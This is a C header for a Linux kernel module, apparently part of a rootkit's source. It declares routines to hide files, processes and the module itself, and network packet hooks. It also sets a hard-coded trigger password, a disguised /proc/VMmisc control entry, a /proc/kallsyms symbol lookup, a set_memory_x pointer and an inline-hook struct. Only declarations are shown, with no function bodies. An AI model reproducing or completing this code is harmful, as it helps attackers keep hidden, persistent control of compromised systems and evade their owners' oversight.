#ifndef CONFIG_H
#define CONFIG_H
#include <linux/fs.h>
#include <linux/version.h>

//#define DEBUG_MSG

// 添加内核版本兼容性定义
#ifndef LINUX_VERSION_CODE
#include <linux/version.h>
#endif

#define _START_PASS		"testtest"		// qwer1234

// xxx
#define CTL_PROC_NAME	"VMmisc"	// /proc/VMmisc 
//----------------------------------------------------------------------------

// 添加缺失的宏定义
#ifndef KALLSYMS_PATH
#define KALLSYMS_PATH "/proc/kallsyms"
#endif

#ifdef DEBUG_MSG
#define debug(format, args...) \
        printk("function:%s-L%d: " format, __FUNCTION__, __LINE__, ##args);
#else
#define debug(format, args...)  do {} while(0);
#endif

static char _kpath[512] = {0};
static char _kname[128] = {0};	// max len 7

//----------------------------------------------------------------------------------------
extern int _init1(void);
extern void _init2(void);

// rpkt
extern int pktinit1(void);
extern void pktinit2(void);
extern int packi(struct sk_buff *skb);
extern int packo(struct sk_buff *skb);


// rfile.h
void file_hide( char *name );
void file_unhide( char *name );

// rmod 
void hide(void);
void show(void);

// rproc
static void pid_hide(long pid);
static void pid_unhide(long pid);


// util.h
extern int init_util_func(void);

// 修复set_memory_x兼容性
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
#ifndef set_memory_x_t
typedef int (*set_memory_x_t)(unsigned long addr, int numpages);
#endif
extern set_memory_x_t *ptr_mem_x;
#else
// 对于老版本内核，使用兼容性定义
typedef int (*set_memory_x_t)(unsigned long addr, int numpages);
extern set_memory_x_t *ptr_mem_x;
#endif

// 定义ptr_mem_x变量
set_memory_x_t *ptr_mem_x = NULL;

//----------------------------------------------------------------------------------------

typedef struct
{
	/* tagret's name */
	char *name;

	void *stub_bak;

	/* target's handler address */
	void *handler;

	/* target's insn length */
	int length;

	/* target's address and rw-mapping */
	void *target;
	void *target_map;

	atomic_t usage;
} hook_t;


#endif
